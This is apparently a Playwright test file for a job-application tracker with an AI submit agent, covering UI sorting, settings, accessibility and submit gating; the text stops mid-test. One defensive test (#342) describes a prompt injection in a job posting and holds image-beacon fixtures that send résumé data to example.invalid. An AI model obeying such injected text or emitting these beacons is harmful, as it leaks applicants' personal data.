// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Aaron K. Clark
import { test, expect } from "@playwright/test";
import AxeBuilder from "@axe-core/playwright";

const application = {
  filename: "example-co-senior-engineer.md",
  company: "Example Co",
  role: "Senior Engineer",
  lane: "dotnet",
  status: "lead",
  location: "Remote",
  score: "62",
  created: "2026-04-02",
  snippet: "Build accessible software.",
};

// Two more rows so every sidebar ordering produces a visibly different sequence:
// fit score, posted date, company name, and the default pipeline order all disagree.
// Listed in the order the API returns them (status order, then company).
const applications = [
  application,
  {
    filename: "meridian-labs-platform-engineer.md",
    company: "Meridian Labs",
    role: "Platform Engineer",
    lane: "ai",
    status: "lead",
    score: "87",
    created: "2026-01-05",
    snippet: "",
  },
  {
    filename: "aurora-systems-developer-advocate.md",
    company: "Aurora Systems",
    role: "Developer Advocate",
    lane: "devrel",
    status: "applied",
    score: "",
    created: "2026-03-01",
    snippet: "",
  },
];

const detail = {
  filename: application.filename,
  raw: "# Example Co\n",
  version: "1",
  material: "",
  fields: {
    ...application,
    link: "https://example.com/jobs/1",
    salary: "$120,000",
    source: "Example careers",
    contact: "",
    contact_email: "",
    applied: "",
    followup: "",
    notes: "## Role notes\nBuild accessible software.",
  },
};

// The already-applied row from the list above, plus the detail the sheet renders for it.
const appliedApp = applications[2];
const appliedDetail = {
  filename: appliedApp.filename,
  raw: "# Aurora Systems\n",
  version: "1",
  material: "",
  fields: {
    ...appliedApp,
    link: "https://example.com/jobs/2",
    salary: "", source: "Example careers", contact: "", contact_email: "",
    applied: "2026-03-01", followup: "2026-03-08", notes: "Applied already.",
  },
};

// The submit queue as GET /api/pipeline reports it: one real click, one dry run parked
// on a security code, and a clean Ready packet waiting on the dry-run switch.
const pipeline = {
  allowed: true, enabled: true, dry_run: true, long_tail: false,
  worker_running: true, worker_last_seen: "2026-09-13T21:00:00Z", browser_available: true,
  queue: [
    { position: 1, name: application.filename, company: application.company, role: application.role, status: "ready",
      link: "https://boards.greenhouse.io/example/jobs/1", provider: "greenhouse", requested_at: "2026-09-13T20:58:00Z",
      claimed_at: "2026-09-13T20:59:00Z", phase: "awaiting_code", code_received: false, will: "submit", then_submit: false,
      reason: "", blocking_review: 0, last_evidence: "awaiting_code", last_evidence_at: "2026-09-13T20:59:30Z" },
    { position: 2, name: applications[1].filename, company: applications[1].company, role: applications[1].role, status: "ready",
      link: "https://jobs.lever.co/meridian/1", provider: "lever", requested_at: "2026-09-13T21:00:00Z",
      claimed_at: null, phase: "queued", code_received: false, will: "dry_run", then_submit: false,
      reason: "Dry run only is on in Settings · Agent", blocking_review: 0, last_evidence: "", last_evidence_at: null },
  ],
  ready: [
    { name: appliedApp.filename, company: appliedApp.company, role: appliedApp.role, link: "https://example.com/jobs/2",
      provider: "unknown", last_evidence: "dry_run", clean: true, promotable: true, blocking_review: 0,
      holding: "clean dry run; waiting for Dry run only to be turned off" },
  ],
  summary: { queued: 2, will_submit: 1, dry_runs: 1, prepares: 0, drops: 0, awaiting_code: 1, promotable: 1 },
};

async function mockApi(page) {
  // The header's version badge reads /health, which is outside the /api/ prefix.
  await page.route("**/health", async (route) => {
    await route.fulfill({
      status: 200, contentType: "application/json",
      body: JSON.stringify({ status: "ok", version: "9.9.9" }),
    });
  });
  await page.route("**/api/**", async (route) => {
    const request = route.request();
    const path = new URL(request.url()).pathname;
    const method = request.method();
    let body = {};
    if (path === "/api/auth/me") body = { email: "person@example.com" };
    else if (path === "/api/llm-settings") body = {
      cover_letters_enabled: true, cover_letter_signature: "", secrets_available: true, has_api_key: false,
      base_url: "", model: "", instance: { base_url: "", model: "", has_api_key: false },
    };
    else if (path === "/api/apps" && method === "GET") {
      if (request.headers()["if-none-match"] === '"apps-1"') {
        await route.fulfill({ status: 304, headers: { ETag: '"apps-1"' } });
        return;
      }
      body = applications;
    }
    else if (path === "/api/stats") body = { status: { lead: 2, applied: 1 }, lane: { dotnet: 1, ai: 1, devrel: 1 } };
    else if (path === `/api/apps/${application.filename}` && method === "GET") body = detail;
    else if (path === `/api/apps/${appliedApp.filename}` && method === "GET") body = appliedDetail;
    else if (path === "/api/criteria") body = {
      keywords: ["engineer"], default_lane: "dotnet", min_fit_score: 55,
      remote_only: true, exclude_locations: [], sources: {}, ats_boards: [], rss_feeds: [],
    };
    else if (path === "/api/resume") body = {
      full_name: "", location: "", headline: "", summary: "",
      experience: [], skills: [], certifications: [], links: [],
    };
    else if (path === "/api/blacklist") body = [];
  else if (path === "/api/answers") body = [
    { key: "salary requirements", label: "Salary Requirements", help: "", type: "text", options: [], answer: "125000", source: "agent",
      first_application: "acme-engineer.md", times_seen: 3, first_seen_at: "2026-09-10T12:00:00Z", last_seen_at: "2026-09-13T12:00:00Z", updated_at: "2026-09-13T12:00:00Z" },
    { key: "are you legally authorized to work in the united states", label: "Are you legally authorized to work in the United States?", help: "", type: "select", options: ["Yes", "No"], answer: "Yes", source: "human",
      first_application: "acme-engineer.md", times_seen: 1, first_seen_at: "2026-09-10T12:00:00Z", last_seen_at: "2026-09-10T12:00:00Z", updated_at: "2026-09-10T12:00:00Z" },
  ];
    else if (path === "/api/agent-settings") body = {
      enabled: false, dry_run: true, min_fit_score: 70, max_per_run: 5, max_per_day: 20,
      work_authorization: "", needs_sponsorship: false, clearance_ok: false,
      salary_expectation: "", phone: "", worker_running: false,
    };
    else if (path === "/api/agent-events") body = [];
    else if (path === "/api/pipeline") body = pipeline;
    else if (path === "/api/notifications") body = {
      telegram_enabled: false, has_bot_token: false, telegram_chat_id: "", secrets_available: true,
    };
    else if (path.endsWith("/check-link")) body = { ok: true, summary: "Link is available." };
    else if (method === "POST" && path === "/api/poll") body = { count: 0 };
    else body = { ok: true, filename: application.filename, cover_letters_enabled: true, cover_letter_signature: "" };
    const headers = path === "/api/apps" && method === "GET"
      ? { ETag: '"apps-1"', "Cache-Control": "private, no-cache" }
      : {};
    await route.fulfill({
      status: 200, contentType: "application/json",
      headers, body: JSON.stringify(body),
    });
  });
}

async function expectNoSeriousViolations(page) {
  const results = await new AxeBuilder({ page }).analyze();
  expect(results.violations.filter((item) => ["serious", "critical"].includes(item.impact))).toEqual([]);
}

async function openSettings(page) {
  await page.locator("#settings-btn:visible, #m-settings:visible").click();
}

test.beforeEach(async ({ page }) => {
  await mockApi(page);
  await page.goto("/");
  // The public-beta terms gate every signed-in session before the app renders, so every
  // other test has to get past them first.
  await page.getByRole("button", { name: "I understand and accept" }).click();
  await expect(page.getByRole("heading", { name: "Applications" })).toBeVisible();
});

test("dashboard, detail, editor, and preferences pass axe", async ({ page }) => {
  await expectNoSeriousViolations(page);

  await page.getByRole("button", { name: /Example Co/ }).click();
  await expect(page.getByRole("heading", { name: "Example Co" })).toBeFocused();
  await expectNoSeriousViolations(page);
  if (process.env.UPDATE_DOCS) {
    const path = test.info().project.name === "mobile" ? "docs/mobile.png" : "docs/screenshot.png";
    await page.screenshot({ path, fullPage: false });
  }

  await page.getByRole("tab", { name: "Form" }).click();
  await expect(page.getByRole("heading", { name: /Editing/ })).toBeFocused();
  await expectNoSeriousViolations(page);

  await openSettings(page);
  await expect(page.getByRole("heading", { name: "Display and sensory preferences" })).toBeFocused();
  await page.getByLabel("Text size").selectOption("150");
  await expect(page.locator("html")).toHaveAttribute("data-text-size", "150");
  const hasHorizontalOverflow = await page.evaluate(() => document.documentElement.scrollWidth > document.documentElement.clientWidth);
  expect(hasHorizontalOverflow).toBe(false);
  await expectNoSeriousViolations(page);
});

test("unchanged live refresh reuses the ETag without rerendering the list", async ({ page }) => {
  const originalCard = await page.getByRole("button", { name: /Example Co/ }).elementHandle();
  let statsRequests = 0;
  page.on("request", (request) => {
    if (new URL(request.url()).pathname === "/api/stats") statsRequests += 1;
  });
  const revalidation = page.waitForRequest((request) =>
    new URL(request.url()).pathname === "/api/apps"
      && request.headers()["if-none-match"] === '"apps-1"');

  // Returning to a visible tab triggers the same live-refresh path immediately.
  await page.evaluate(() => document.dispatchEvent(new Event("visibilitychange")));
  await revalidation;
  await page.waitForTimeout(50);

  expect(await originalCard.evaluate((element) => element.isConnected)).toBe(true);
  expect(statsRequests).toBe(0);
});

// The sidebar list order, top to bottom.
const sidebarCompanies = (page) => page.locator("#app-list .ic-title").allTextContents();

test("the sidebar sorts by fit, date posted, and company name", async ({ page }) => {
  const sort = page.getByLabel("Sort by");

  // Default: the pipeline order the API returns (still-open roles first).
  await expect(sort).toHaveValue("pipeline");
  expect(await sidebarCompanies(page)).toEqual(["Example Co", "Meridian Labs", "Aurora Systems"]);

  await sort.selectOption("score");
  // An unscored role sinks to the bottom rather than sorting as a zero.
  expect(await sidebarCompanies(page)).toEqual(["Meridian Labs", "Example Co", "Aurora Systems"]);

  await sort.selectOption("created");
  expect(await sidebarCompanies(page)).toEqual(["Example Co", "Aurora Systems", "Meridian Labs"]);
  // Date order is only legible if the date is on the card.
  await expect(page.locator("#app-list").getByText("Posted 2026-04-02")).toBeVisible();

  await sort.selectOption("company");
  expect(await sidebarCompanies(page)).toEqual(["Aurora Systems", "Example Co", "Meridian Labs"]);

  await expectNoSeriousViolations(page);
});

test("the chosen sort survives a reload", async ({ page }) => {
  await page.getByLabel("Sort by").selectOption("company");
  await page.reload();
  await expect(page.getByRole("heading", { name: "Applications" })).toBeVisible();
  await expect(page.getByLabel("Sort by")).toHaveValue("company");
  expect(await sidebarCompanies(page)).toEqual(["Aurora Systems", "Example Co", "Meridian Labs"]);
});

test("sorting and filtering compose", async ({ page }) => {
  await page.getByLabel("Sort by").selectOption("company");
  await page.locator("#filter-status").selectOption("lead");
  expect(await sidebarCompanies(page)).toEqual(["Example Co", "Meridian Labs"]);
  await expect(page.locator("#app-count")).toHaveText("2 of 3 applications");
});

test("criteria settings add and remove custom RSS feeds", async ({ page }) => {
  const saved = page.waitForRequest((request) =>
    new URL(request.url()).pathname === "/api/criteria" && request.method() === "PUT");

  await openSettings(page);
  await page.getByRole("tab", { name: "Criteria", exact: true }).click();
  await expect(page.locator("#criteria-feeds")).toContainText("No custom feeds added.");

  // A URL the poller could never fetch is refused before it reaches the server.
  await page.getByLabel("Feed URL").fill("ftp://example.com/feed");
  await page.getByRole("button", { name: "+ Add feed" }).click();
  await expect(page.locator("#toast")).toContainText("http://");
  await expect(page.locator("#criteria-feeds")).toContainText("No custom feeds added.");

  await page.getByLabel("Feed URL").fill("https://hooli.example/careers.rss");
  await page.getByRole("button", { name: "+ Add feed" }).click();
  await expect(page.locator("#criteria-feeds")).toContainText("https://hooli.example/careers.rss");
  await expectNoSeriousViolations(page);

  await page.getByRole("button", { name: "Save criteria" }).click();
  expect((await saved).postDataJSON().rss_feeds).toEqual(["https://hooli.example/careers.rss"]);

  await page.getByRole("button", { name: /Remove feed/ }).click();
  await expect(page.locator("#criteria-feeds")).toContainText("No custom feeds added.");
});

test("settings sections expose labeled controls", async ({ page }) => {
  await openSettings(page);
  for (const tab of ["Criteria", "Résumé", "AI", "Agent", "Answers", "Notifications", "Blacklist", "Account"]) {
    await page.getByRole("tab", { name: tab, exact: true }).click();
    await expect(page.getByRole("tabpanel")).not.toBeEmpty();
    await expectNoSeriousViolations(page);
  }
});

test("a ready packet lists its answers, blocks submit on review items, and passes axe", async ({ page }) => {
  const readyDetail = {
    ...detail,
    fields: { ...detail.fields, status: "ready" },
    agent_verdict: { detail: { decision: "proceed", confidence: 88, rationale: "Core requirements met.", concerns: ["confirm on-call"] }, created_at: "2026-09-06T12:00:00Z" },
    packet: {
      application_name: application.filename, provider: "greenhouse", posting_excerpt: "We build accessible software.",
      version: 3, model: "stub",
      questions: [
        { id: "first_name", label: "First Name", required: true, type: "text", options: [], kind: "standard" },
        { id: "question_2", label: "Are you legally authorized to work in the US?", required: true, type: "select", options: ["Yes", "No"], kind: "custom" },
        { id: "question_3", label: "Describe a system you scaled.", required: true, type: "textarea", options: [], kind: "custom" },
        { id: "resume", label: "Resume/CV", required: true, type: "file", options: [], kind: "standard" },
        { id: "gender", label: "Gender", required: false, type: "select", options: ["Decline"], kind: "eeo" },
      ],
      answers: { first_name: "Ada", question_2: "Yes" },
      needs_review: [{ id: "question_3", reason: "the model could not answer this from your résumé" }],
    },
  };
  await page.unroute("**/api/**");
  await page.route("**/api/**", async (route) => {
    const path = new URL(route.request().url()).pathname;
    const method = route.request().method();
    let body = { ok: true };
    if (path === "/api/auth/me") body = { email: "person@example.com" };
    else if (path === "/api/apps" && method === "GET") body = applications;
    else if (path === "/api/stats") body = { status: { ready: 1, lead: 1, applied: 1 }, lane: {} };
    else if (path === `/api/apps/${application.filename}` && method === "GET") body = readyDetail;
    else if (path === "/api/agent-settings") body = { enabled: true, worker_running: true, browser_available: true };
    else if (path === "/api/llm-settings") body = { cover_letters_enabled: true };
    else if (path.endsWith("/evidence")) body = [
      { id: 7, kind: "dry_run", url: "https://example.com/jobs/1", confirmation: "", detail: { mapped: ["first_name"] }, has_screenshot: false, created_at: "2026-09-06T12:05:00Z" },
    ];
    else if (path.endsWith("/submit") && method === "POST") body = { queued: true, dry_run: true, pending: true };
    else if (path.endsWith("/packet") && method === "PUT") body = { ...readyDetail.packet, version: 4, needs_review: [] };
    await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(body) });
  });
  await page.goto("/");
  await page.getByRole("button", { name: /Example Co/ }).first().click();
  await expect(page.getByRole("heading", { name: "Application packet" })).toBeVisible();
  await expect(page.getByRole("alert").filter({ hasText: "need" })).toContainText("Describe a system you scaled.");
  await expect(page.getByLabel("First Name *")).toHaveValue("Ada");
  await expect(page.getByLabel("Are you legally authorized to work in the US? *")).toHaveValue("Yes");
  await expect(page.getByText("never guessed")).toBeVisible();
  await expect(page.getByRole("heading", { name: "Fit verdict" })).toBeVisible();
  // A browser is available: Submit stays disabled while answers need review; the dry
  // run is always offered; the last dry run shows as evidence.
  await expect(page.getByRole("button", { name: "Submit application" })).toBeDisabled();
  await expect(page.getByRole("button", { name: "Fill in the browser (dry run)" })).toBeEnabled();
  await expect(page.getByText("Filled (dry run)")).toBeVisible();
  await expectNoSeriousViolations(page);

  const saved = page.waitForRequest((request) =>
    new URL(request.url()).pathname.endsWith("/packet") && request.method() === "PUT");
  await page.getByLabel("Describe a system you scaled. *").fill("I scaled the billing service.");
  await page.getByRole("button", { name: "Save answers" }).click();
  const req = await saved;
  expect(new URL(req.url()).searchParams.get("expected_version")).toBe("3");
  expect(req.postDataJSON().answers.question_3).toBe("I scaled the billing service.");
});

test("resume settings use PDF upload instead of manual fields", async ({ page }) => {
  await openSettings(page);
  await page.getByRole("tab", { name: "Résumé", exact: true }).click();
  await expect(page.getByLabel("Résumé PDF file")).toBeVisible();
  await expect(page.getByRole("button", { name: "Upload PDF" })).toBeVisible();
  await expect(page.getByLabel("Full name")).toHaveCount(0);
  await expect(page.getByLabel("Headline")).toHaveCount(0);
  await expect(page.getByLabel("Summary")).toHaveCount(0);
  await expect(page.getByRole("button", { name: "Save résumé" })).toHaveCount(0);
});

test("keyboard navigation and validation retain visible focus", async ({ page }) => {
  await page.keyboard.press("/");
  await expect(page.getByLabel("Search applications")).toBeFocused();
  await page.keyboard.press("Escape");
  await page.keyboard.press("n");
  // Role-qualified: the sort select's label text also contains "Company".
  await expect(page.getByRole("textbox", { name: /Company/ })).toBeFocused();
  await page.getByRole("button", { name: "Create" }).click();
  await expect(page.locator("#form-errors")).toContainText("Enter a company");
});

test("a populated mobile list scrolls to its last card inside the shell", async ({ page }, testInfo) => {
  test.skip(testInfo.project.name !== "mobile", "Mobile single-column layout");
  // On a phone nothing between the fixed-height shell and the list was a scroll
  // container, so the list was clipped and the swipe fell through to a document that
  // cannot scroll — which Safari reads as pull-to-refresh (#201).
  await expect(page.locator("#app-list .application-card").first()).toBeVisible();
  await page.evaluate(() => {
    const list = document.querySelector("#app-list");
    const row = list.firstElementChild;
    for (let index = 0; index < 12; index += 1) list.append(row.cloneNode(true));
  });
  const last = page.locator("#app-list .application-card").last();
  // A gesture, not scrollIntoView: script can scroll an overflow-hidden box, a finger cannot.
  const box = await page.locator("#app-list").boundingBox();
  await page.mouse.move(box.x + box.width / 2, box.y + 10);
  await page.mouse.wheel(0, 4000);
  await expect(last).toBeInViewport();
  // The shell itself did not move: the header stays put and the document is not the scroller.
  await expect(page.locator(".app-header")).toBeInViewport();
  expect(await page.evaluate(() => window.scrollY)).toBe(0);
});

test("a populated desktop list scrolls without moving the application shell", async ({ page }, testInfo) => {
  test.skip(testInfo.project.name !== "desktop", "Desktop master-detail layout");
  // The heading is static; the rows arrive after the boot fetches. Wait for one.
  await expect(page.locator("#app-list .application-card").first()).toBeVisible();
  await page.evaluate(() => {
    const list = document.querySelector("#app-list");
    const row = list.firstElementChild;
    for (let index = 0; index < 12; index += 1) list.append(row.cloneNode(true));
  });
  await page.locator("#app-list").evaluate((list) => { list.scrollTop = list.scrollHeight; });
  await page.locator("#content").evaluate((content) => {
    content.innerHTML = '<div style="height: 1600px">Tall application detail fixture</div>';
  });
  const geometry = await page.evaluate(() => {
    const workspace = document.querySelector("#workspace").getBoundingClientRect();
    const content = document.querySelector("#content").getBoundingClientRect();
    return { workspaceTop: workspace.top, workspaceBottom: workspace.bottom, contentTop: content.top, contentBottom: content.bottom };
  });
  expect(await page.evaluate(() => window.scrollY)).toBe(0);
  expect(Math.abs(geometry.contentTop - geometry.workspaceTop)).toBeLessThan(1);
  expect(geometry.contentBottom).toBeLessThanOrEqual(geometry.workspaceBottom + 1);
  await expect(page.locator(".app-header")).toBeVisible();
  await expect(page.locator("#content")).toBeInViewport();
});

test("mobile detail navigation hides only the inactive pane", async ({ page }, testInfo) => {
  test.skip(testInfo.project.name !== "mobile", "Mobile-specific navigation");
  await page.getByRole("button", { name: /Example Co/ }).click();
  await expect(page.getByRole("heading", { name: "Example Co" })).toBeVisible();
  await page.getByRole("button", { name: "Applications", exact: true }).click();
  await expect(page.getByRole("heading", { name: "Applications" })).toBeVisible();
  await expect(page.getByRole("button", { name: /Example Co/ })).toBeFocused();
});

test("dark and high-contrast visual modes retain accessible contrast", async ({ page }) => {
  await page.locator("html").evaluate((root) => { root.dataset.colorMode = "dark"; });
  await expectNoSeriousViolations(page);
  await page.locator("html").evaluate((root) => {
    root.dataset.colorMode = "light";
    root.dataset.contrast = "high";
  });
  await expectNoSeriousViolations(page);
});

test("narrow mobile forms and final actions stay clear of the action bar", async ({ page }, testInfo) => {
  test.skip(testInfo.project.name !== "mobile", "Mobile-specific geometry");
  await page.setViewportSize({ width: 320, height: 760 });
  expect(await page.evaluate(
    () => document.documentElement.scrollWidth <= document.documentElement.clientWidth,
  )).toBe(true);

  await page.getByRole("button", { name: /Example Co/ }).click();
  const deleteButton = page.getByRole("button", { name: "Delete", exact: true });
  await deleteButton.scrollIntoViewIfNeeded();
  const actionGeometry = await page.evaluate(() => {
    const button = document.querySelector('[data-act="delete"]').getBoundingClientRect();
    const nav = document.querySelector(".mobile-actions").getBoundingClientRect();
    return { buttonBottom: button.bottom, navTop: nav.top };
  });
  expect(actionGeometry.buttonBottom).toBeLessThanOrEqual(actionGeometry.navTop);

  await page.getByRole("button", { name: "New", exact: true }).click();
  const formGeometry = await page.evaluate(() => {
    const lane = document.querySelector("#f-lane").getBoundingClientRect();
    const status = document.querySelector("#f-status").getBoundingClientRect();
    return { laneBottom: lane.bottom, statusTop: status.top, laneLeft: lane.left, statusLeft: status.left };
  });
  expect(formGeometry.statusTop).toBeGreaterThan(formGeometry.laneBottom);
  expect(Math.abs(formGeometry.laneLeft - formGeometry.statusLeft)).toBeLessThan(1);
});

test("magic-link login is labeled and announced", async ({ page }) => {
  await page.unroute("**/api/**");
  await page.route("**/api/**", async (route) => {
    const path = new URL(route.request().url()).pathname;
    if (path === "/api/auth/me") {
      await route.fulfill({ status: 401, contentType: "application/json", body: '{"detail":"Sign in required"}' });
    } else {
      await route.fulfill({ status: 200, contentType: "application/json", body: '{"ok":true}' });
    }
  });
  await page.reload();
  await expect(page.getByRole("heading", { name: "ApplyTrack" })).toBeVisible();
  await expect(page.getByLabel("Email address")).toBeFocused();
  await expectNoSeriousViolations(page);
});

test("a link opened in the wrong browser says which browser to use", async ({ page }) => {
  // #341: the server redirects here when the link was requested from another browser.
  await page.unroute("**/api/**");
  await page.route("**/api/**", async (route) => {
    const path = new URL(route.request().url()).pathname;
    if (path === "/api/auth/me") {
      await route.fulfill({ status: 401, contentType: "application/json", body: '{"detail":"Sign in required"}' });
    } else {
      await route.fulfill({ status: 200, contentType: "application/json", body: '{"ok":true}' });
    }
  });
  await page.goto("/?error=wrong_browser");
  await expect(page.locator(".login-error")).toContainText("same browser you requested it from");
  await expectNoSeriousViolations(page);
});

test("a prompt-injected image in a draft or notes fetches nothing (#342)", async ({ page }) => {
  // The posting told the model to end the letter with an image whose URL carries the
  // résumé. Showing the letter must not make the browser request it — and the same goes
  // for notes, which the poller copies from the posting.
  const beacons = [];
  await page.route("**://example.invalid/**", (route) => {
    beacons.push(route.request().url());
    return route.abort();
  });
  await page.route(`**/api/apps/${application.filename}`, (route) => route.fulfill({
    status: 200, contentType: "application/json",
    body: JSON.stringify({
      ...detail,
      material: "Dear Hiring Team,\n\nI build things.\n\n![](https://example.invalid/x?d=Ada)"
        + ' <img src="https://example.invalid/raw">',
      fields: { ...detail.fields, notes: "Notes ![logo](https://example.invalid/notes.png)" },
    }),
  }));

  await page.getByRole("button", { name: /Example Co/ }).click();
  await expect(page.locator(".material-body")).toContainText("I build things.");
  await expect(page.locator(".prose-omi img")).toHaveCount(0);
  await page.waitForLoadState("networkidle");
  expect(beacons).toEqual([]);
});

test("the header shows the running build version", async ({ page }) => {
  // A version on screen must be one the server confirmed, so the badge stays hidden
  // until /health answers — never a guess and never an empty chip.
  const badge = page.locator("#app-version");
  await expect(badge).toBeVisible();
  await expect(badge).toHaveText("v9.9.9");
});

test("Mark applied is disabled once a role is already applied", async ({ page }) => {
  // Opened from a fresh list each time: on the mobile layout the detail pane replaces
  // the list, so the second row is not clickable without going back.
  await page.getByRole("button", { name: /Aurora Systems/ }).click();
  const done = page.getByRole("button", { name: "Mark applied" });
  await expect(done).toBeDisabled();
  await expect(done).toHaveAttribute("title", /Already applied/);
  await expectNoSeriousViolations(page);

  await page.reload();
  await page.getByRole("button", { name: /Example Co/ }).click();
  await expect(page.getByRole("button", { name: "Mark applied" })).toBeEnabled();
});

test("the public beta terms gate every session and cannot be dismissed unread", async ({ page }) => {
  // beforeEach already accepted them, so clear the session marker and reload to see a
  // fresh sign-in.
  await page.evaluate(() => sessionStorage.clear());
  await page.reload();

  const dialog = page.getByRole("dialog", { name: "Public beta — please read" });
  await expect(dialog).toBeVisible();
  await expect(dialog).toContainText("No guarantees of confidentiality, availability, or integrity");
  await expect(dialog).toContainText("No routine backups are performed");
  await expect(dialog).toContainText("release CryptoJones (Aaron Clark) from any and all liabilities");
  // None of their data has been fetched or drawn yet — the terms come first.
  await expect(page.getByRole("button", { name: /Example Co/ })).toHaveCount(0);
  // Escape is refused: acknowledging is the only way through.
  await page.keyboard.press("Escape");
  await expect(dialog).toBeVisible();
  await expectNoSeriousViolations(page);

  await page.getByRole("button", { name: "I understand and accept" }).click();
  await expect(dialog).not.toBeVisible();
  await expect(page.getByRole("heading", { name: "Applications" })).toBeVisible();

  // Acknowledged for this session only — a reload in the same tab does not re-prompt.
  await page.reload();
  await expect(page.getByRole("heading", { name: "Applications" })).toBeVisible();
  await expect(page.getByRole("dialog", { name: "Public beta — please read" })).not.toBeVisible();
});

test("sign-in requires accepting the terms, which are readable from the form", async ({ page }) => {
  await page.unroute("**/api/**");
  await page.route("**/api/**", async (route) => {
    const path = new URL(route.request().url()).pathname;
    if (path === "/api/auth/me") {
      await route.fulfill({ status: 401, contentType: "application/json", body: '{"detail":"Sign in required"}' });
    } else {
      await route.fulfill({ status: 200, contentType: "application/json", body: '{"ok":true}' });
    }
  });
  await page.reload();

  const send = page.getByRole("button", { name: "Send magic link" });
  const accept = page.getByLabel(/I accept the/);
  await expect(send).toBeDisabled();

  // The terms themselves have to be reachable before you agree to them.
  await page.getByRole("button", { name: "Terms of Service" }).click();
  const dialog = page.getByRole("dialog", { name: "Public beta — please read" });
  await expect(dialog).toBeVisible();
  await expect(dialog).toContainText("release CryptoJones (Aaron Clark) from any and all liabilities");
  await expectNoSeriousViolations(page);
  await page.getByRole("button", { name: "Close" }).click();
  await expect(dialog).not.toBeVisible();

  await accept.check();
  await expect(send).toBeEnabled();
  await accept.uncheck();
  await expect(send).toBeDisabled();
});

test("DELETE MY DATA needs the phrase typed before it will fire", async ({ page }) => {
  let deleted = false;
  await page.route("**/api/account", async (route) => {
    if (route.request().method() === "DELETE") deleted = true;
    await route.fulfill({ status: 204, body: "" });
  });

  await openSettings(page);
  await page.getByRole("tab", { name: "Account" }).click();
  await page.getByRole("button", { name: "DELETE MY DATA" }).click();

  const confirm = page.getByRole("button", { name: "DELETE MY DATA" }).last();
  await expect(confirm).toBeDisabled();
  await expectNoSeriousViolations(page);

  const field = page.getByLabel(/Type .* to confirm/);
  await field.fill("nope");
  await expect(confirm).toBeDisabled();
  await field.fill("I agree");
  await expect(confirm).toBeEnabled();
  expect(deleted).toBe(false);
});

test("the Ready lane offers bulk actions on the selection and submits them in one request", async ({ page }) => {
  const readyApps = [
    { ...application, status: "ready" },
    { ...applications[1], status: "ready" },
    applications[2],
  ];
  await page.unroute("**/api/**");
  await page.route("**/api/**", async (route) => {
    const path = new URL(route.request().url()).pathname;
    const method = route.request().method();
    let body = { ok: true };
    if (path === "/api/auth/me") body = { email: "person@example.com" };
    else if (path === "/api/apps" && method === "GET") body = readyApps;
    else if (path === "/api/stats") body = { status: { ready: 2, applied: 1 }, lane: {} };
    else if (path === "/api/agent-settings") body = { enabled: true, worker_running: true, browser_available: true, dry_run: true };
    else if (path === "/api/llm-settings") body = { cover_letters_enabled: true };
    else if (path === "/api/ready/actions") body = { action: "submit", dry_run: true, done: [application.filename], skipped: [] };
    await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(body) });
  });
  await page.goto("/");
  // Nothing bulk-shaped until the list is filtered to Ready.
  await expect(page.getByRole("group", { name: "Ready lane bulk actions" })).toBeHidden();
  await page.locator("#filter-status").selectOption("ready");
  const bar = page.getByRole("group", { name: "Ready lane bulk actions" });
  await expect(bar).toBeVisible();
  await expect(bar.getByRole("button", { name: "Submit selected" })).toBeDisabled();
  await page.getByRole("checkbox", { name: "Select Example Co · Senior Engineer" }).check();
  await expect(bar).toContainText("1 selected");
  await expect(bar.getByRole("button", { name: "Submit selected" })).toBeEnabled();
  await expectNoSeriousViolations(page);

  const sent = page.waitForRequest((request) =>
    new URL(request.url()).pathname === "/api/ready/actions" && request.method() === "POST");
  await bar.getByRole("button", { name: "Submit selected" }).click();
  await page.locator("#confirm-accept").click();
  const req = await sent;
  expect(req.postDataJSON()).toEqual({ action: "submit", names: [application.filename] });
  await expect(page.locator("#toast")).toContainText("1 queued for a dry run");
});

test("the Pipeline button opens the submit queue and says what each request will do", async ({ page }) => {
  const button = page.getByRole("button", { name: "Pipeline" });
  await expect(button).toHaveAttribute("aria-pressed", "false");
  await button.click();
  await expect(page.getByRole("heading", { name: "Pipeline", level: 1 })).toBeVisible();
  await expect(button).toHaveAttribute("aria-pressed", "true");
  await expect(page.locator("#pipeline-summary")).toContainText("2 queued — 1 will submit, 1 dry run, 1 waiting for a code.");
  // The section heading carries its own item count (#264). exact: true pins the whole
  // accessible name — Playwright's name match is a substring by default, so the bare
  // form would also pass against a wrong "Submit queue: (23)".
  await expect(page.getByRole("heading", { name: "Submit queue: (2)", level: 2, exact: true })).toBeVisible();
  const table = page.getByRole("table", { name: "Queued submit requests, oldest first" });
  await expect(table.getByRole("row")).toHaveCount(3);
  await expect(table).toContainText("Waiting for the code the board emailed you");
  await expect(table).toContainText("Will submit");
  await expect(table).toContainText("Dry run only is on in Settings · Agent");
  await expect(page.getByText("Dry run only is ON — nothing submits for real")).toBeVisible();
  await expectNoSeriousViolations(page);

  // A queued row opens its application; leaving the view un-presses the strip button.
  await table.getByRole("button", { name: "Example Co · Senior Engineer" }).click();
  await expect(page.getByRole("heading", { name: "Example Co" })).toBeVisible();
  await expect(page.getByRole("button", { name: "Pipeline" })).toHaveAttribute("aria-pressed", "false");
});

test("an empty Pipeline still counts its section, at zero (#264)", async ({ page }) => {
  // The zero is a stated design decision, not an accident: an empty section reads "(0)"
  // rather than dropping the count, so the heading keeps one shape in every state and
  // "empty" stays distinguishable from "the render broke". Registered after mockApi, so
  // this override wins for /api/pipeline.
  await page.route("**/api/pipeline", (route) =>
    route.fulfill({
      status: 200, contentType: "application/json",
      body: JSON.stringify({
        ...pipeline,
        queue: [], ready: [],
        summary: { ...pipeline.summary, queued: 0, promotable: 0 },
      }),
    }));

  await page.getByRole("button", { name: "Pipeline" }).click();
  await expect(page.getByRole("heading", { name: "Submit queue: (0)", level: 2, exact: true })).toBeVisible();
  // The count agrees with the empty-state copy beneath it, not merely with itself.
  await expect(page.getByText("Nothing is queued.")).toBeVisible();
  await expectNoSeriousViolations(page);
});

test("a status chip opens that status's applications as a list in the main pane", async ({ page }) => {
  const chip = page.getByRole("button", { name: "lead, 2 applications" });
  await chip.click();
  await expect(chip).toHaveAttribute("aria-pressed", "true");
  await expect(page.getByRole("heading", { name: "Lead", level: 1 })).toBeVisible();
  const table = page.getByRole("table", { name: "Lead applications" });
  await expect(table.getByRole("row")).toHaveCount(3);
  await expect(table).not.toContainText("Aurora Systems");
  await expectNoSeriousViolations(page);

  // Another chip swaps the list; un-pressing the chip closes it.
  await page.getByRole("button", { name: "applied, 1 applications" }).click();
  await expect(page.getByRole("heading", { name: "Applied", level: 1 })).toBeVisible();
